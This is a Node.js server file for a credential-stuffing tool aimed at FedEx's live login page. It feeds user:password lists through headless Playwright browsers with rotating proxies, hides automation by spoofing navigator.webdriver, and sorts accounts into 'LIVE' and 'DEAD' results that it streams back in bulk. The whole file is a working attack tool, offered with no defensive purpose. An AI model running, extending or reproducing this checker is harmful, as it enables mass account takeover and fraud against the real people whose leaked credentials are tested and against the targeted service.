require('dotenv').config();
const express = require('express');
const { chromium } = require('playwright');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

function log(level, msg) {
  const ts = new Date().toISOString().split('T')[1].split('.')[0];
  console.log(`[${ts}] [${level}] ${msg}`);
}

async function testProxy(proxy) {
  const [host, port] = proxy.split(':');
  try {
    const browser = await chromium.launch({
      headless: true,
      args: [
        '--no-sandbox', '--disable-setuid-sandbox',
        '--disable-dev-shm-usage', '--disable-gpu',
        `--proxy-server=${host}:${port}`
      ]
    });
    const page = await browser.newPage();
    await page.goto('https://httpbin.org/ip', { timeout: 15000, waitUntil: 'domcontentloaded' });
    const body = await page.textContent('body');
    await browser.close();
    const match = body.match(/"origin":\s*"([^"]+)"/);
    return { alive: true, ip: match ? match[1] : 'unknown' };
  } catch (e) {
    return { alive: false, error: e.message };
  }
}

async function tryLogin(userId, password, proxy) {
  let browser;
  const startTime = Date.now();
  try {
    const launchOpts = {
      headless: true,
      args: [
        '--no-sandbox', '--disable-setuid-sandbox',
        '--disable-dev-shm-usage', '--disable-gpu',
        '--disable-blink-features=AutomationControlled'
      ]
    };
    if (proxy) {
      const [host, port] = proxy.split(':');
      launchOpts.args.push(`--proxy-server=${host}:${port}`);
    }

    browser = await chromium.launch(launchOpts);
    const context = await browser.newContext({
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      ignoreHTTPSErrors: true,
      viewport: { width: 1366, height: 768 },
      locale: 'en-GB'
    });
    await context.addInitScript(() => {
      Object.defineProperty(navigator, 'webdriver', { get: () => false });
    });
    const page = await context.newPage();

    log('INFO', `[${userId}] Navigating to FedEx login...`);
    await page.goto('https://www.fedex.com/secure-login/en-gb/#/credentials', {
      waitUntil: 'domcontentloaded',
      timeout: 30000
    });
    await page.waitForTimeout(5000);

    try {
      const cookieBtn = page.locator('button:has-text("ACCEPT ALL COOKIES")');
      if (await cookieBtn.isVisible({ timeout: 3000 })) {
        await cookieBtn.click();
        await page.waitForTimeout(1000);
        log('INFO', `[${userId}] Cookie banner dismissed`);
      }
    } catch {}

    const currentUrl = page.url();
    log('INFO', `[${userId}] Page loaded: ${currentUrl}`);

    if (!currentUrl.includes('secure-login') && !currentUrl.includes('/credentials')) {
      await browser.close();
      log('LIVE', `[${userId}] Already logged in -> ${currentUrl}`);
      return { success: true, redirectedTo: currentUrl, proxy: proxy || 'direct', time: Date.now() - startTime };
    }

    let userField = null;
    try { userField = page.locator('#username'); await userField.waitFor({ state: 'visible', timeout: 10000 }); log('INFO', `[${userId}] Found #username`); } catch {}
    if (!userField) try { userField = page.locator('input[formcontrolname="userId"]'); await userField.waitFor({ state: 'visible', timeout: 5000 }); } catch {}
    if (!userField) try { userField = page.getByRole('textbox', { name: 'User ID' }); await userField.waitFor({ state: 'visible', timeout: 5000 }); } catch {}

    if (!userField) {
      const bodyText = await page.textContent('body').catch(() => '');
      await browser.close();
      log('DEAD', `[${userId}] Form not found. Body: ${(bodyText || '').substring(0, 200)}`);
      return { success: false, redirectedTo: currentUrl, proxy: proxy || 'direct', time: Date.now() - startTime, error: 'Login form not loaded (blocked or CAPTCHA)' };
    }

    log('INFO', `[${userId}] Filling credentials...`);
    await userField.fill(userId);
    await page.locator('input[type="password"]').first().fill(password);
    await page.locator('#login_button').click();
    log('INFO', `[${userId}] Submitted, waiting...`);
    await page.waitForTimeout(6000);

    const finalUrl = page.url();
    const finalTitle = await page.title();
    const isLoggedIn = !finalUrl.includes('/credentials') && !finalUrl.includes('secure-login');

    await browser.close();
    const elapsed = Date.now() - startTime;
    log(isLoggedIn ? 'LIVE' : 'DEAD', `[${userId}] ${isLoggedIn ? 'LIVE' : 'DEAD'} | URL: ${finalUrl} | ${elapsed}ms | proxy: ${proxy || 'direct'}`);

    return { success: isLoggedIn, redirectedTo: finalUrl, proxy: proxy || 'direct', time: elapsed };
  } catch (err) {
    if (browser) await browser.close().catch(() => {});
    const elapsed = Date.now() - startTime;
    log('ERR', `[${userId}] ${err.message} | ${elapsed}ms`);
    return { success: false, error: err.message, proxy: proxy || 'direct', time: elapsed };
  }
}

app.post('/api/test-proxy', async (req, res) => {
  const { proxy } = req.body;
  if (!proxy) return res.status(400).json({ error: 'No proxy provided' });
  log('INFO', `Testing proxy: ${proxy}`);
  const result = await testProxy(proxy);
  log('INFO', `Proxy ${proxy}: ${result.alive ? 'ALIVE (' + result.ip + ')' : 'DEAD'}`);
  res.json(result);
});

app.post('/api/check', async (req, res) => {
  const { accounts, proxies, threads } = req.body;

  if (!accounts || !accounts.length) {
    return res.status(400).json({ error: 'No accounts provided' });
  }

  const concurrency = Math.min(Math.max(parseInt(threads) || 1, 1), 10);

  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no'
  });

  const proxyList = (proxies || []).filter(p => p.trim());
  const results = { success: [], dead: [] };
  let checked = 0;
  const total = accounts.length;

  log('INFO', `Starting: ${total} accounts, ${proxyList.length} proxies, ${concurrency} threads`);

  function send(data) {
    res.write(`data: ${JSON.stringify(data)}\n\n`);
  }

  async function processAccount(line) {
    if (!line || !line.includes(':')) return;
    const colonIdx = line.indexOf(':');
    const userId = line.substring(0, colonIdx).trim();
    const password = line.substring(colonIdx + 1).trim();
    if (!userId || !password) return;

    const proxy = proxyList.length > 0
      ? proxyList[Math.floor(Math.random() * proxyList.length)].trim()
      : null;

    const result = await tryLogin(userId, password, proxy);

    const entry = {
      user: userId,
      pass: password,
      proxy: result.proxy,
      url: result.redirectedTo || '',
      error: result.error || '',
      time: result.time || 0
    };

    if (result.success) {
      results.success.push(entry);
    } else {
      results.dead.push(entry);
    }

    checked++;
    send({
      type: 'progress',
      index: checked,
      total,
      result: result.success ? 'success' : 'dead',
      entry
    });
  }

  const queue = [...accounts];
  async function worker() {
    while (queue.length > 0) {
      const line = queue.shift().trim();
      await processAccount(line);
    }
  }

  const workers = [];
  for (let i = 0; i < concurrency; i++) {
    workers.push(worker());
  }
  await Promise.all(workers);

  send({
    type: 'done',
    total,
    successCount: results.success.length,
    deadCount: results.dead.length,
    results
  });

  log('INFO', `Done: ${results.success.length} live, ${results.dead.length} dead`);
  res.end();
});

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.listen(PORT, () => {
  log('INFO', `FedServer running on port ${PORT}`);
});
